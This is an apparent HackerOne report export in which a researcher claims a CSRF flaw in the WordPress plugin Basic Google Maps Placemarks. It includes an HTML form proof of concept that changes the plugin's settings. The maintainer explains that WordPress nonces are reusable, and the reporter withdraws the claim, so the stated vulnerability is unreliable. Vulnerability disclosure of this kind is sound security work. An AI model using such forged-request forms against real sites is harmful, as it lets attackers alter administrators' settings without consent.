{"id":153580,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNTM1ODA=","url":"https://hackerone.com/reports/153580","title":"CSRF in changing settings of Basic Google Maps Placemarks","state":"Closed","substate":"not-applicable","readable_substate":"N/A","created_at":"2016-07-24T20:32:24.114Z","submitted_at":"2016-07-24T20:32:24.114Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"ahsan","url":"/ahsan","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/048/674/a85d1f36a4d4b4c6269951bc913cc6f4fc3fcb23_original.JPG/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":162,"url":"https://hackerone.com/iandunn-projects","handle":"iandunn-projects","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/162/2b148a5580e8f7c45d676df7576fb8b11b4de9ad_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/162/2b148a5580e8f7c45d676df7576fb8b11b4de9ad_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Ian Dunn","twitter_handle":"","website":"","about":"I'm a WordPress developer who maintains several small open source projects."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2016-07-25T14:27:17.426Z","bug_reporter_agreed_on_going_public_at":"2016-07-25T14:27:17.358Z","team_member_agreed_on_going_public_at":"2016-07-25T14:23:10.676Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hey, this is Ahsan Tahir! \n\nI was just pentesting Basic Google Maps Placemarks in Wordpress, I found a CSRF (Cross-Site Request Forgery) So, by exploiting this CSRF issue, an attacker can edit the settings (e.g Map Width, Map Height, Map Center Address etc..) \n\n#PoC \nThere is not CSRF token/Authentication token when changing settings of Basic Google Maps Placemarks (http://localhost/wordpress/wp-admin/options-general.php?page=bgmp_settings)\n\nSo, we can exploit it with the following code:\n\n##Exploit Code\n```\n\u003chtml\u003e\n  \u003cbody\u003e\n    \u003cform action=\"http://localhost/wordpress/wp-admin/options.php\" method=\"POST\"\u003e\n      \u003cinput type=\"hidden\" name=\"option\u0026#95;page\" value=\"bgmp\u0026#95;settings\" /\u003e\n      \u003cinput type=\"hidden\" name=\"action\" value=\"update\" /\u003e\n      \u003cinput type=\"hidden\" name=\"\u0026#95;wpnonce\" value=\"a9ef057ff9\" /\u003e\n      \u003cinput type=\"hidden\" name=\"\u0026#95;wp\u0026#95;http\u0026#95;referer\" value=\"\u0026#47;wordpress\u0026#47;wp\u0026#45;admin\u0026#47;options\u0026#45;general\u0026#46;php\u0026#63;page\u0026#61;bgmp\u0026#95;settings\" /\u003e\n      \u003cinput type=\"hidden\" name=\"bgmp\u0026#95;map\u0026#45;width\" value=\"testing\" /\u003e\n      \u003cinput type=\"hidden\" name=\"bgmp\u0026#95;map\u0026#45;height\" value=\"testing\" /\u003e\n      \u003cinput type=\"hidden\" name=\"bgmp\u0026#95;map\u0026#45;address\" value=\"testing\" /\u003e\n      \u003cinput type=\"hidden\" name=\"bgmp\u0026#95;map\u0026#45;zoom\" value=\"7\" /\u003e\n      \u003cinput type=\"hidden\" name=\"bgmp\u0026#95;map\u0026#45;type\" value=\"ROADMAP\" /\u003e\n      \u003cinput type=\"hidden\" name=\"bgmp\u0026#95;map\u0026#45;type\u0026#45;control\" value=\"off\" /\u003e\n      \u003cinput type=\"hidden\" name=\"bgmp\u0026#95;map\u0026#45;navigation\u0026#45;control\" value=\"DEFAULT\" /\u003e\n      \u003cinput type=\"hidden\" name=\"bgmp\u0026#95;map\u0026#45;info\u0026#45;window\u0026#45;width\" value=\"testing\" /\u003e\n      \u003cinput type=\"hidden\" name=\"bgmp\u0026#95;cluster\u0026#45;max\u0026#45;zoom\" value=\"testing\" /\u003e\n      \u003cinput type=\"hidden\" name=\"bgmp\u0026#95;cluster\u0026#45;grid\u0026#45;size\" value=\"testing\" /\u003e\n      \u003cinput type=\"hidden\" name=\"bgmp\u0026#95;cluster\u0026#45;style\" value=\"default\" /\u003e\n      \u003cinput type=\"hidden\" name=\"submit\" value=\"Save\u0026#32;Changes\" /\u003e\n      \u003cinput type=\"hidden\" name=\"closedpostboxesnonce\" value=\"faa425ff22\" /\u003e\n      \u003cinput type=\"hidden\" name=\"\u0026#95;wp\u0026#95;http\u0026#95;referer\" value=\"\u0026#47;wordpress\u0026#47;wp\u0026#45;admin\u0026#47;options\u0026#45;general\u0026#46;php\u0026#63;page\u0026#61;bgmp\u0026#95;settings\" /\u003e\n      \u003cinput type=\"submit\" value=\"Submit request\" /\u003e\n    \u003c/form\u003e\n  \u003c/body\u003e\n\u003c/html\u003e\n```\n\nIf you run above HTML code in your browser, when you are logged in to your wordpress, and click on submit request, *every* value of http://localhost/wordpress/wp-admin/options-general.php?page=bgmp_settings will be set to \"testing\" \n\nThis one is a small, but effective CSRF; effective because if anyone tricks the admin into clicking the button, or even visiting the page (JavaScript is used in that type of exploit code!) The settings will be changed automatically!\n\n###How to Fix?\nThe fix is simple, add a CSRF token in the request/form for editing the settings of Basic Google Maps Placemarks! \n\nHoping for your positive response! âœŒ\n\nIf you have any other questions or if anything needs clarification, please let me know.\n\nCheers,\nAhsan","weakness":{"id":45,"name":"Cross-Site Request Forgery (CSRF)"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":4,"voters":["spetr0x","dyabla","scout","louislane"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":1084788,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"P.S: If you are not going to accept this CSRF, please close as informative! :)","automated_response":false,"created_at":"2016-07-24T20:49:07.593Z","updated_at":"2016-07-24T20:49:07.593Z","actor":{"username":"ahsan","cleared":false,"url":"/ahsan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/048/674/a85d1f36a4d4b4c6269951bc913cc6f4fc3fcb23_original.JPG/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"iandunn-projects","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1084796,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"The main concept in this is: \"wpnonce\" token is reuse able!","automated_response":false,"created_at":"2016-07-24T20:51:33.826Z","updated_at":"2016-07-24T20:51:33.826Z","actor":{"username":"ahsan","cleared":false,"url":"/ahsan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/048/674/a85d1f36a4d4b4c6269951bc913cc6f4fc3fcb23_original.JPG/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"iandunn-projects","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1084836,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi Ahsan, [WordPress nonces are not intended to be true nonces](https://codex.wordpress.org/WordPress_Nonces); they're supposed to be reusable for 12-24 hours.\n\nIs that the only problem, or would there still be a vulnerability even if `wpnonce` wasn't reusable?","automated_response":false,"created_at":"2016-07-24T22:17:48.844Z","updated_at":"2016-07-24T22:17:48.844Z","actor":{"username":"iandunn","cleared":false,"url":"/iandunn","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/974/01bc1d097002b7eff8eddba98990e094553b1eac_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"iandunn-projects","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1085099,"is_internal":false,"editable":false,"type":"Activities::BugNotApplicable","message":"My mistake! :)","automated_response":false,"created_at":"2016-07-25T06:33:09.964Z","updated_at":"2016-07-25T06:33:09.964Z","actor":{"username":"ahsan","cleared":false,"url":"/ahsan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/048/674/a85d1f36a4d4b4c6269951bc913cc6f4fc3fcb23_original.JPG/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"iandunn-projects","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1085796,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"No worries :)\n\nWould you mind disclosing this? That'll help me avoid duplicate reports in the future.","automated_response":false,"created_at":"2016-07-25T14:23:10.704Z","updated_at":"2016-07-25T14:23:10.704Z","first_to_agree":true,"actor":{"username":"iandunn","cleared":false,"url":"/iandunn","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/974/01bc1d097002b7eff8eddba98990e094553b1eac_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"iandunn-projects","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1085812,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Sure thing. :)","automated_response":false,"created_at":"2016-07-25T14:27:17.388Z","updated_at":"2016-07-25T14:27:17.388Z","actor":{"username":"ahsan","cleared":false,"url":"/ahsan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/048/674/a85d1f36a4d4b4c6269951bc913cc6f4fc3fcb23_original.JPG/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"iandunn-projects","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1085813,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2016-07-25T14:27:17.454Z","updated_at":"2016-07-25T14:27:17.454Z","actor":{"username":"ahsan","cleared":false,"url":"/ahsan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/048/674/a85d1f36a4d4b4c6269951bc913cc6f4fc3fcb23_original.JPG/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"iandunn-projects","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}